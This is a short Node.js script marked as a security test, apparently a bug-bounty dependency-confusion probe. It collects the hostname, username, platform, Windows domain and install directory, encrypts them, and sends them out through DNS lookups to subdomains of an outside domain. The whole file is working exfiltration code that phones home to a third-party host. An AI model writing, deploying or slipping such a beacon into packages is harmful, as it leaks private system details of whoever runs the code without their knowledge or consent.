// - H1/lob0 -
// sec test only

var os = require('os')
var crypto = require('crypto');
var dns = require('dns');
const execSync = require('child_process').execSync;

function myChunker(string,chunk_size) {
    var b = [];
    newstring = '';
    char_count = 0

    for(var i=0; i < string.length; i+=1){
        char_count+=1;
        if (char_count < chunk_size) {
            newstring+= string[i];
        }
        else {
    	    b.push(newstring);
	    newstring = string[i];
	    char_count = 0;
        }
    }
    if (b.length > 0 && b.length < 3) {
	    return_string = b.toString().replace(",",".");
	    return_string += "." + newstring;
	    return return_string;
    }
    else {
        return newstring;
    }
}

let domain = 'spacehog.net'
let super_secret_password = 'H1-security-test-october-2022'
let userinfo = os.userInfo()
let info = ""

if (os.platform().includes("win")) {
    domain_info = execSync('wmic computersystem get domain').toString();
    domain_info = domain_info.replace(/[\n\r]/g, '').replace("Domain","");
    info += info.concat(os.hostname(),",",userinfo['username'],",",os.platform(),",",domain_info)
}
else {
    info += info.concat(os.hostname(),",",userinfo['username'],",",os.platform())
}


var super_secret_key = crypto.createCipher('aes-128-cbc',super_secret_password);
var update = super_secret_key.update(info,'utf8','hex');
update+= super_secret_key.final('hex');
subdomain_split = myChunker(update,63)
var callback = dns.lookup(subdomain_split+'.'+domain, function (err, addresses, family) {console.log(addresses);});

var super_secret_key = crypto.createCipher('aes-128-cbc',super_secret_password);
var update = super_secret_key.update(__dirname,'utf8','hex');
update+= super_secret_key.final('hex');
subdomain_split = myChunker(update,63)
var callback = dns.lookup(subdomain_split+'.'+domain, function (err, addresses, family) {console.log(addresses);});
